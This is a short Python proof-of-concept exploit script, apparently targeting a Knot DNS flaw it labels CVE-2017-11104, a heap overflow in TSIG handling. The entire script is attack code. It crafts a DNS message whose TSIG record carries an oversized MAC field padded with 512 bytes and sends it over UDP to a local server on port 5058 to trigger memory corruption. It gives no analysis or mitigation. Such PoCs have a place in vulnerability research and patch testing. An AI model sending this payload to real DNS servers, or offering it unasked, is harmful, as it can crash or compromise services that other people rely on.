#!/usr/bin/env python3
"""
PoC: CVE-2017-11104 - Knot DNS heap overflow in TSIG handling
Trigger: DNS message with malformed TSIG record
"""

import socket
import struct

s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# DNS message with malformed TSIG (type 250) in additional section
hdr = struct.pack(">HHHHHH", 0x1234, 0x0100, 1, 0, 0, 1)
qry = b"\x04test\x00\x00\x01\x00\x01"
# TSIG record with oversized MAC data triggering heap overflow
tsig = (
    b"\x04tsig\x00\x00\xfa\x00\xff\x00\x00\x00\x00\x01\x00" + b"\x00" * 6 + b"\xff\xff" + b"X" * 512
)
s.sendto(hdr + qry + tsig, ("localhost", 5058))
s.close()
